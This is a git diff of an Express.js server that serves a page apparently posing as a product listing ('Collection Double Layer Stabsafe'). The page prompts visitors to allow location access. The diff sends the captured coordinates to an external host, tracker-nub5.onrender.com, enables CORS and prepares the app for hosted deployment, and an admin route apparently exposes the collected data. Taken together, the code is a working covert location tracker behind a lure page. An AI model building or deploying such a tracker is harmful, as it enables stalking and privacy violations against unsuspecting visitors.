@@ -1,8 +1,10 @@
 const express = require('express');
 const https = require('https');
+const cors = require('cors');
 
 const app = express();
 
+app.use(cors());
 app.use(express.json());
 
 app.set('trust proxy', true);
@@ -49,8 +51,9 @@ app.get('/', (req, res) => {
                 </head>
 
                 <body>
+
                     <h1>Collection Double Layer Stabsafe</h1>
-                    <p>Loading...</p>
+                    <p>Please allow location access.</p>
 
                     <script>
 
@@ -58,7 +61,7 @@ app.get('/', (req, res) => {
 
                         (position) => {
 
-                            fetch('/save-location', {
+                            fetch('https://tracker-nub5.onrender.com/save-location', {
 
                                 method: 'POST',
 
@@ -124,8 +127,10 @@ app.get('/admin', (req, res) => {
 });
 
 // START SERVER
-app.listen(3000, () => {
+const PORT = process.env.PORT || 3000;
 
-    console.log('Server running on port 3000');
+app.listen(PORT, () => {
+
+    console.log(`Server running on port ${PORT}`);
 
 });
